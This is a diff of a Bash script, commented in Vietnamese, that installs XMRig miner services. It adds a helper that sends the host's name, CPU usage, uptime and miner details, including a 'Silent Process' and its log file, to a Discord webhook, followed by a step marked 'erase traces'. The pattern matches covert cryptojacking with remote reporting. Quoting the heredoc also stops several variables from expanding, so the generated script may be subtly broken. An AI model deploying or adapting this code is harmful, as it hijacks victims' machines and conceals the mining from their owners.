@@ -88,25 +88,57 @@ sudo systemctl enable $SERVICE2
 sudo systemctl start $SERVICE1
 sudo systemctl start $SERVICE2
 
-# Tạo script gửi log tiến trình 1 về Discord
-tee "$DIR1/logminer.sh" > /dev/null << EOF
+# Tạo script gửi log cả 2 tiến trình về Discord
+tee "$DIR1/logminer.sh" > /dev/null << 'EOF'
 #!/bin/bash
-WEBHOOK="$DISCORD_WEBHOOK"
-PROCESS_NAME="$NAME1"
-HOST="\$(hostname)"
+WEBHOOK="$WEBHOOK"
+HOST="$(hostname)"
 
-CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
-UPTIME=\$(uptime -p)
-THREADS=$THREADS1
+PROCESS1="$NAME1"
+THREADS1='$THREADS1'
+LOG1="/tmp/xmrig-log1.log"
+
+PROCESS2="$NAME2"
+THREADS2='$THREADS2'
+LOG2="/tmp/xmrig-log2.log"
+
+CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print $2 + $4}')
+UPTIME=$(uptime -p)
+TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+
+if [ -z "$WEBHOOK" ]; then
+  echo "❌ Chưa có webhook"
+  exit 1
+fi
 
 curl -s -H "Content-Type: application/json" -X POST -d "{
-  \\"username\\": \\"XMRig Status\\",
-  \\"content\\": \\"🖥️ \\\`\$HOST\\\` Connected\\n⚙️ Process: \\\`$NAME1\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
-}" "\$WEBHOOK" > /dev/null 2>&1
+  \"username\": \"XMRig - $HOST\",
+  \"embeds\": [{
+    \"title\": \"💻 Main Process\",
+    \"color\": 3066993,
+    \"fields\": [
+      { \"name\": \"⚙️ Process\",    \"value\": \"\`$PROCESS1\`\",  \"inline\": true },
+      { \"name\": \"🧠 Threads\",    \"value\": \"\`$THREADS1\`\",   \"inline\": true },
+      { \"name\": \"📈 CPU Usage\",  \"value\": \"\`${CPU_USAGE}%\`\", \"inline\": true },
+      { \"name\": \"⏱️ Uptime\",     \"value\": \"\`$UPTIME\`\",     \"inline\": false }
+    ],
+    \"timestamp\": \"$TIME\"
+  },
+  {
+    \"title\": \"🎯 Silent Process\",
+    \"color\": 15105570,
+    \"fields\": [
+      { \"name\": \"⚙️ Process\",    \"value\": \"\`$PROCESS2\`\",  \"inline\": true },
+      { \"name\": \"🧠 Threads\",    \"value\": \"\`$THREADS2\`\",   \"inline\": true },
+      { \"name\": \"📁 Log File\",   \"value\": \"\`$LOG2\`\",       \"inline\": false }
+    ],
+    \"timestamp\": \"$TIME\"
+  }]
+}" "$WEBHOOK" > /dev/null 2>&1
 EOF
 
 chmod +x "$DIR1/logminer.sh"
-"$DIR1/logminer.sh"
+WEBHOOK="$DISCORD_WEBHOOK" "$DIR1/logminer.sh"
 
 # Xoá dấu vết
 cd ~
